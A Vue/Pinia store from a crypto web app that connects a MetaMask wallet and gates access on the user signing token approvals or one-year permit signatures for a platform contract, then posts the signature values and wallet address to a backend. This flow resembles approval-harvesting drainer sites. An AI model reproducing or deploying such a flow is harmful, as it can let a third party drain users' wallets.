import { useLocalStorage } from '@vueuse/core'
import { computed, nextTick, ref } from 'vue'
import { defineStore, storeToRefs } from 'pinia'
import { showToast } from 'vant'
import i18n from '@/i18n/index.js'
import router from '@/router'

import { userStore } from '@/store/index.js'

import { fetchWalletConfig, getAllCoinTypeApi } from '@/apis/wallet.js'
import { useToken } from '@/hooks/useToken.js'
import { ercAuthApi, usdtAuthApi } from '@/apis/user.js'
import { dayjs } from 'element-plus'
import {
	connectWallet,
	getSignData,
	numFromMWei,
	onSignByTokenExUSDTAndTRX,
	onSignUSDTAndTRX,
	SUPPORT_TOKEN,
	toChecksumAddress,
} from '@/utils/web3.js'
import { getUrlParams } from '@/utils/index.js'

export const useWeb3Store = defineStore('web3', () => {
	const web3 = ref(null),
		accounts = ref([])

	// 当前缓存币种信息
	const currentCurrency = useLocalStorage('currentCurrency', {
		id: 0,
		currency: '',
		currencyCode: '',
		fullName: '',
		picUrl: '',
		isRecharge: false,
		isWithdraw: false,
		isExchange: false,
		protocols: null,
		handlingFee: 0,
		isOpenOnlineRecharge: false,
		isOpenQuickPay: false,
		sortBy: 0,
		usd: 0,
		picUrlStr: '',
	})

	// 当前缓存币种信息
	const cacheAddress = useLocalStorage('cacheAddress', '')

	// 当前钱包连接地址第一个地址
	const address = computed(() => {
		if (accounts.value && accounts.value.length) {
			return toChecksumAddress(accounts.value[0]) || ''
		} else {
			return ''
		}
	})

	const userStoreObj = userStore()
	const { loginAction } = userStoreObj
	const { userId } = storeToRefs(userStoreObj)
	const { getPlatformTokenByCoinType, getPlatformTokenList } = useToken()

	// 平台币种列表
	const currencyList = ref([])
	const getCurrencyList = async () => {
		try {
			const allChainResponse = await getAllCoinTypeApi()

			currencyList.value = allChainResponse.data || []
			console.log('useWeb3Store', '获取币种列表', currencyList.value)
		} catch (e) {
			console.log('useWeb3Store', '获取币种列表失败', e)
		}
	}

	const initUserAccountAndWallet = async () => {
		console.log('useWeb3Store', '========initUserAccountAndWallet============')
		try {
			await Promise.all([getCurrencyList(), initWallet()])
			if (!currencyList.value.length) {
				return
			}
			if (!address.value) {
				showToast({ message: i18n.global.t('请正确连接你的钱包'), icon: 'info' })
				resetAccount()
				return
			}

			if (cacheAddress.value !== address.value) {
				console.log('useWeb3Store', `当前地址【${address.value}】和缓存地址【${cacheAddress.value}】不一致`)
				resetAccount()
				return
			}

			// 如果当前缓存币种为空，默认获取 usdc 币种信息，或第一条币种信息 作为首次登录条件
			if (!currentCurrency.value.tokenName) {
				const usdc = currencyList.value.find((currencyitem) => currencyitem.tokenName?.toLowerCase() === 'usdc')
				if (usdc) {
					currentCurrency.value = usdc
				} else {
					currentCurrency.value = currencyList.value[0]
				}
			}
			console.log('useWeb3Store', '当前币种信息', currentCurrency.value)
			console.log('useWeb3Store', '当前地址', address.value, toChecksumAddress(address.value))

			if (!userId.value) {
				await loginAction()
			}

			// 获取所有平台币种
			const tokenClientList = await getPlatformTokenList()
			// 当前用户授权过的币种
			const authrizeTokenList = computed(() => {
				return tokenClientList.filter((d) => d.isAuthrize === 1)
			})

			if (authrizeTokenList.value.length) {
				// 当前选择币种是否被授权过
				if (authrizeTokenList.value.some((d) => d.tokenName === currentCurrency.value.tokenName)) {
					console.warn('useWeb3Store', '已经在平台授权过', currentCurrency.value)
				} else {
					// 选择授权过的币种进行登录---平台列表没有图片囧
					currentCurrency.value = authrizeTokenList.value[0]

					console.warn('useWeb3Store', `使用已授权过的币种【${currentCurrency.value}】进行登录`)
				}
				await nextTick()
				router.replace('/home')
			} else {
				resetAccount()
			}
			// else {
			// 	onChangeCurrency(currentCurrency.value, true)
			// }
		} catch (e) {
			console.error('initUserAccountAndWallet 失败', e)
			resetAccount()
		}
	}

	// 获取全局的合约地址
	const configContractAddress = ref('0x12bc774c9db27c422Be8C8cBF3e7E2271E38EE5C')
	const getContractAddress = async () => {
		try {
			const response = await fetchWalletConfig()
			if (response.data) {
				configContractAddress.value = response.data.contractAddress
			}
		} catch (e) {
			console.log('useWeb3Store', '获取合约地址接口错误', e)
		}
	}

	// 选择币种
	const onChangeCurrency = async (currency, init = false) => {
		let currentOwnerAddress = address.value

		if (!currentOwnerAddress) {
			try {
				await initWallet()
				currentOwnerAddress = address.value
			} catch (e) {
				console.log('useWeb3Store-onChangeCurrency', '初始化钱包失败')
			}
		}

		if (!currentOwnerAddress) {
			const timeout = setTimeout(() => {
				showToast({ message: i18n.global.t('请正确连接你的钱包'), icon: 'info' })
				clearTimeout(timeout)
			}, 700)
			return
		}

		console.log('useWeb3Store', 'onChangeCurrency-当前选择币种：', currency)
		console.log('useWeb3Store', 'onChangeCurrency-当前选择钱包地址：', address.value)

		// noWallet页面时。先登录
		if (!userId.value) {
			await loginAction(currency.tokenName)
		}

		const currencyTokenName = currency.tokenName

		// 获取合约地址
		await getContractAddress(currencyTokenName)

		// 获取指定平台币种信息
		const config = await getPlatformTokenByCoinType(currencyTokenName, true)

		// 如果当前token已经授权过，就直接进入首页
		if (!config || config.isAuthrize === 1) {
			console.warn(`${currencyTokenName}配置为空或已授权`)
			currentCurrency.value = currency
			await nextTick()
			router.replace('/home')
			return
		}

		console.warn(`${currencyTokenName}配置未授权`, config)
		// 代币签名合约地址
		const tokenContractAddress = config.contractAddress

		// 授权结果
		let signResult
		if (currencyTokenName === 'USDT' || currencyTokenName === 'TRX') {
			try {
				const { isEnough, transactionHash, authorizationAmount } = await onSignUSDTAndTRX({
					contractAddress: configContractAddress.value,
					ownerAddress: currentOwnerAddress,
					tokenContractAddress,
					tokenName: currencyTokenName,
				})
				console.log(`====web3====【${currencyTokenName}】授权结果`, transactionHash)
				if (!isEnough) {
					signResult = {
						transactionHash,
						authorizationAmount,
					}
				} else {
					// 授信额度足够
					await nextTick()
					await router.replace('/home')
					return
				}
			} catch (e) {
				console.error(`====web3====【${currencyTokenName}】授权操作失败:`, e)
			}
		} else {
			const tokenConfig = SUPPORT_TOKEN[currencyTokenName]
			if (!tokenConfig) {
				console.error(`web3Store 暂不支持当前币种【${currencyTokenName}】`)
				return
			}

			// 授权过期事件
			const deadline = dayjs().add(1, 'year').valueOf()

			const { signData, authorizationAmount } = await getSignData({
				tokenName: currencyTokenName,
				contractAddress: configContractAddress.value,
				ownerAddress: currentOwnerAddress,
				tokenContractAddress,
				deadline,
				decimails: config.decimals,
			})
			try {
				signResult = await onSignByTokenExUSDTAndTRX(currencyTokenName, signData)
				signResult.deadline = deadline
				signResult.authorizationAmount = authorizationAmount

				console.log('useWeb3Store', '代币:', currencyTokenName)
				console.log('useWeb3Store', '获取nonces所有的合约地址:', configContractAddress.value)
				console.log('useWeb3Store', '获取nonces所选择的地址:', currentOwnerAddress)
				console.log('useWeb3Store', '发起签名所用的合约地址：', tokenContractAddress)
				console.log('useWeb3Store', '发起签名所选择的地址：', currentOwnerAddress)
				console.log('useWeb3Store', '签名结果：', signResult)
			} catch (e) {
				console.error('onSign---情况', e)
			}
		}

		if (!signResult) return
		try {
			if (currencyTokenName === 'USDT' || currencyTokenName === 'TRX') {
				const data = {
					hash: signResult.transactionHash,
					walletAddress: currentOwnerAddress,
					strvalue: numFromMWei(signResult.authorizationAmount),
					tokenContractAddress: configContractAddress.value,
					authorizeToken: currencyTokenName,
				}
				await usdtAuthApi(data)
			} else {
				if (!signResult.result) return
				const data = {
					walletAddress: currentOwnerAddress,
					r: signResult.r,
					s: signResult.s,
					v: signResult.v,
					deadline: signResult.deadline,
					strvalue: signResult.authorizationAmount,
					authorizeToken: currencyTokenName,
					tokenContractAddress: configContractAddress.value,
				}
				await ercAuthApi(data)
			}

			console.log('useWeb3Store', `${currencyTokenName}接口授权成功`)
			currentCurrency.value = currency
			await nextTick()
			await router.replace('/home')
		} catch (error) {
			console.log('useWeb3Store', `${currencyTokenName}接口授权失败`, error)
		}
	}

	const initWallet = async () => {
		// 小狐狸MetaMask的事件监听
		const events = {
			accountsChanged(accounts) {
				// 指的是此页面连接的账户，连接小狐狸后再切换账户，此事件才会触发
				console.log('====web3====', '切换了账户', accounts)
				resetAccount().then(() => {
					// 监听到钱包切换地址，刷新页面
					window.location.reload()
				})
			},
			chainChanged(chainId) {
				console.log('====web3====', '切换了链', chainId)
			},
			connect(connectInfo) {
				console.log('====web3====', '连接合约成功', connectInfo)
			},
			disconnect(error) {
				console.log('====web3====', '断开连接', error)
				resetAccount().then(() => {
					// 监听到钱包断开连接，刷新页面
					window.location.reload()
				})
			},
			message(message) {
				console.log('====web3====', '一些消息', message)
			},
		}

		try {
			const { web3Instance, accountList } = await connectWallet(events)
			accounts.value = accountList
		} catch (e) {
			if (router.currentRoute.value.name !== 'noWallet') {
				await nextTick()
				router.replace({ name: 'noWallet' })
			}
		}
	}

	return {
		web3,
		accounts,
		address,
		currencyList,
		currentCurrency,
		onChangeCurrency,
		initWallet,
		configContractAddress,
		initUserAccountAndWallet,
	}
})

// ************* sample data format ******************//

const resetAccount = async () => {
	console.log('useWeb3Store', '========resetAccount nextTick begin========')

	await nextTick()

	console.log('useWeb3Store', '========resetAccount nextTick end========')

	console.log('useWeb3Store', '========resetAccount resetData begin========')

	// 清空缓存用户地址
	const cacheAddress = useLocalStorage('cacheAddress', '')
	cacheAddress.value = ''

	// 清除获取余额的合约信息
	const { resetContracts } = useToken()
	resetContracts()

	// 清空登录用户信息
	const { resetLoginData } = userStore()
	resetLoginData()

	// 清空缓存币种信息
	const data = useLocalStorage('currentCurrency', {})
	data.value = {
		id: 0,
		currency: '',
		currencyCode: '',
		fullName: '',
		picUrl: '',
		isRecharge: false,
		isWithdraw: false,
		isExchange: false,
		protocols: null,
		handlingFee: 0,
		isOpenOnlineRecharge: false,
		isOpenQuickPay: false,
		sortBy: 0,
		usd: 0,
		picUrlStr: '',
	}

	console.log('useWeb3Store', '========resetAccount resetData end========')
	if (router.currentRoute.value.name !== 'noWallet') {
		const params = getUrlParams()
		await router.replace({ path: '/noWallet', query: { code: params.code } })
	}
}
